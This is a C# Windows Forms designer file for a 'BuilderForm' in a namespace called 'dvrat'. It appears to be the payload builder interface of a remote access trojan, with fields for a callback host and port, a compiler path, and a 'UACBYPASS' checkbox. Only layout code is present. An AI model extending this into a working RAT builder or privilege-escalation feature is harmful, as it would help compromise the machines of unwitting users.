
namespace dvrat
{
    partial class BuilderForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.line_label = new System.Windows.Forms.Label();
            this.exit_label = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.uac_checkBox1 = new System.Windows.Forms.CheckBox();
            this.header_label = new System.Windows.Forms.Label();
            this.build_button = new System.Windows.Forms.Button();
            this.host_textBox = new System.Windows.Forms.TextBox();
            this.port_numericUpDown1 = new System.Windows.Forms.NumericUpDown();
            this.title_label = new System.Windows.Forms.Label();
            this.compiler_textBox = new System.Windows.Forms.TextBox();
            this.compiler_path_linkLabel = new System.Windows.Forms.LinkLabel();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.port_numericUpDown1)).BeginInit();
            this.SuspendLayout();
            // 
            // line_label
            // 
            this.line_label.Location = new System.Drawing.Point(-20, 15);
            this.line_label.Name = "line_label";
            this.line_label.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.line_label.Size = new System.Drawing.Size(580, 13);
            this.line_label.TabIndex = 0;
            this.line_label.Text = "_________________________________________________________________________________" +
    "_______________________________________________________________________________";
            // 
            // exit_label
            // 
            this.exit_label.AutoSize = true;
            this.exit_label.Font = new System.Drawing.Font("Tahoma", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.exit_label.Location = new System.Drawing.Point(517, 1);
            this.exit_label.Name = "exit_label";
            this.exit_label.Size = new System.Drawing.Size(21, 23);
            this.exit_label.TabIndex = 1;
            this.exit_label.Text = "X";
            this.exit_label.Click += new System.EventHandler(this.exit_label_Click);
            this.exit_label.MouseLeave += new System.EventHandler(this.exit_label_MouseLeave);
            this.exit_label.MouseHover += new System.EventHandler(this.exit_label_MouseHover);
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.groupBox1.Controls.Add(this.uac_checkBox1);
            this.groupBox1.ForeColor = System.Drawing.Color.LightGray;
            this.groupBox1.Location = new System.Drawing.Point(12, 191);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(200, 150);
            this.groupBox1.TabIndex = 2;
            this.groupBox1.TabStop = false;
            // 
            // uac_checkBox1
            // 
            this.uac_checkBox1.AutoSize = true;
            this.uac_checkBox1.Location = new System.Drawing.Point(7, 20);
            this.uac_checkBox1.Name = "uac_checkBox1";
            this.uac_checkBox1.Size = new System.Drawing.Size(166, 17);
            this.uac_checkBox1.TabIndex = 0;
            this.uac_checkBox1.Text = "UACBYPASS FUNC(WIN10 >)";
            this.uac_checkBox1.UseVisualStyleBackColor = true;
            // 
            // header_label
            // 
            this.header_label.ForeColor = System.Drawing.Color.Black;
            this.header_label.Location = new System.Drawing.Point(-23, 1);
            this.header_label.Name = "header_label";
            this.header_label.Size = new System.Drawing.Size(534, 23);
            this.header_label.TabIndex = 3;
            this.header_label.Text = "aa";
            this.header_label.Click += new System.EventHandler(this.header_label_Click);
            this.header_label.MouseDown += new System.Windows.Forms.MouseEventHandler(this.header_label_MouseDown);
            // 
            // build_button
            // 
            this.build_button.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.build_button.Location = new System.Drawing.Point(384, 303);
            this.build_button.Name = "build_button";
            this.build_button.Size = new System.Drawing.Size(127, 38);
            this.build_button.TabIndex = 4;
            this.build_button.Text = "B U I L D";
            this.build_button.UseVisualStyleBackColor = true;
            this.build_button.Click += new System.EventHandler(this.build_button_Click);
            // 
            // host_textBox
            // 
            this.host_textBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.host_textBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.host_textBox.ForeColor = System.Drawing.Color.White;
            this.host_textBox.Location = new System.Drawing.Point(13, 42);
            this.host_textBox.Name = "host_textBox";
            this.host_textBox.Size = new System.Drawing.Size(200, 20);
            this.host_textBox.TabIndex = 5;
            this.host_textBox.Text = "127.0.0.1";
            // 
            // port_numericUpDown1
            // 
            this.port_numericUpDown1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.port_numericUpDown1.ForeColor = System.Drawing.Color.White;
            this.port_numericUpDown1.Location = new System.Drawing.Point(13, 68);
            this.port_numericUpDown1.Maximum = new decimal(new int[] {
            9999,
            0,
            0,
            0});
            this.port_numericUpDown1.Name = "port_numericUpDown1";
            this.port_numericUpDown1.Size = new System.Drawing.Size(199, 20);
            this.port_numericUpDown1.TabIndex = 6;
            this.port_numericUpDown1.Value = new decimal(new int[] {
            8080,
            0,
            0,
            0});
            // 
            // title_label
            // 
            this.title_label.AutoSize = true;
            this.title_label.Font = new System.Drawing.Font("Tahoma", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.title_label.Location = new System.Drawing.Point(8, 0);
            this.title_label.Name = "title_label";
            this.title_label.Size = new System.Drawing.Size(118, 23);
            this.title_label.TabIndex = 7;
            this.title_label.Text = "BUILD FORM";
            // 
            // compiler_textBox
            // 
            this.compiler_textBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.compiler_textBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.compiler_textBox.ForeColor = System.Drawing.Color.White;
            this.compiler_textBox.Location = new System.Drawing.Point(338, 52);
            this.compiler_textBox.Name = "compiler_textBox";
            this.compiler_textBox.Size = new System.Drawing.Size(200, 20);
            this.compiler_textBox.TabIndex = 5;
            this.compiler_textBox.Text = "C:\\Program Files(x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\" +
    "MSBuild.exe";
            // 
            // compiler_path_linkLabel
            // 
            this.compiler_path_linkLabel.ActiveLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(128)))));
            this.compiler_path_linkLabel.AutoSize = true;
            this.compiler_path_linkLabel.LinkColor = System.Drawing.Color.Yellow;
            this.compiler_path_linkLabel.Location = new System.Drawing.Point(268, 54);
            this.compiler_path_linkLabel.Name = "compiler_path_linkLabel";
            this.compiler_path_linkLabel.Size = new System.Drawing.Size(64, 13);
            this.compiler_path_linkLabel.TabIndex = 8;
            this.compiler_path_linkLabel.TabStop = true;
            this.compiler_path_linkLabel.Text = "SetCompiler";
            this.compiler_path_linkLabel.VisitedLinkColor = System.Drawing.Color.Yellow;
            this.compiler_path_linkLabel.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.compiler_path_linkLabel_LinkClicked);
            // 
            // builder_form
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.ClientSize = new System.Drawing.Size(546, 353);
            this.Controls.Add(this.compiler_path_linkLabel);
            this.Controls.Add(this.title_label);
            this.Controls.Add(this.port_numericUpDown1);
            this.Controls.Add(this.compiler_textBox);
            this.Controls.Add(this.host_textBox);
            this.Controls.Add(this.build_button);
            this.Controls.Add(this.header_label);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.exit_label);
            this.Controls.Add(this.line_label);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "builder_form";
            this.Text = "builder_form";
            this.Load += new System.EventHandler(this.builder_form_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.port_numericUpDown1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label line_label;
        private System.Windows.Forms.Label exit_label;
        private System.Windows.Forms.Label header_label;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button build_button;
        private System.Windows.Forms.TextBox host_textBox;
        private System.Windows.Forms.NumericUpDown port_numericUpDown1;
        private System.Windows.Forms.Label title_label;
        private System.Windows.Forms.TextBox compiler_textBox;
        private System.Windows.Forms.LinkLabel compiler_path_linkLabel;
        private System.Windows.Forms.CheckBox uac_checkBox1;
    }
}